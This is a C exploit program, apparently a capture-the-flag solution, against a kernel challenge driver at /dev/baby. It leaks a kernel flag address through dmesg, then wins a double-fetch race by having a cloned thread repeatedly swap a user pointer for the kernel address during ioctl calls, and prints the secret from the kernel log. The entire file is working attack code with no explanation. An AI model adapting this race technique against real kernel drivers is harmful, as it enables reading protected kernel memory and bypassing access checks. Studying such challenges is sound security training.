#define _GNU_SOURCE        
#include <string.h>
#include<stdio.h>
#include <pthread.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include<sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/wait.h>

#define ATTACK 0x1337
#define LEAK 0x6666
#define LEN 0x100
#define DEVICE_FILE "/dev/baby"
#define FLAG_LEN 0x21ul
#define SPRAY 0x1000

int finish=0,fd;
unsigned long flagptr;
struct req{
	char *myflag;
	unsigned long flag_len;
};

void changeptr(void* payload){
	struct req *temp=payload;
	while(finish==0){
		temp->myflag=flagptr;
	}
}

int Open(char *filename,int flags){
	int tfd=open(filename,flags);
	if(tfd<0){
		perror("open failed");
		exit(EXIT_FAILURE);
	}
	return tfd;
}

void leak(){
	ioctl(fd,LEAK,NULL);
	system("dmesg > leak.txt");
	int lfd=Open("leak.txt",O_RDWR);
	lseek(lfd,-LEN,SEEK_END);
	char leaktxt[LEN];
	read(lfd,leaktxt,LEN);
	close(lfd);
	char *leaksbuf=strstr(leaktxt,"Your flag is at");
	if(leaksbuf==NULL){
		perror("flag ptr not found");
		exit(EXIT_FAILURE);
	}
	flagptr=strtoul(leaksbuf+0x10,NULL,16);
	printf("[+] Flagptr=%p\n",(void *)flagptr);	
}

void exploit(){
	char *myguess=(char *)malloc(FLAG_LEN);
	struct req payload={.myflag=myguess,.flag_len=FLAG_LEN};
	void *fakestack = malloc(0x10000);
	if (!fakestack) {
		perror("malloc");
		exit(-1);
	}
	pid_t pid=clone(changeptr,fakestack+0xf000,CLONE_VM|CLONE_FILES|SIGCHLD,&payload);
	for(int i=0;i<0x1000;i++){
		ioctl(fd,ATTACK,&payload);
		payload.myflag=myguess;
	}
	finish=1;
	wait(NULL);
}

int main(){
	fd=Open(DEVICE_FILE,O_RDWR);
	leak();
	exploit();
	close(fd);
	puts("[+] flag:");
	system("dmesg | grep secret");
	return 0;
}
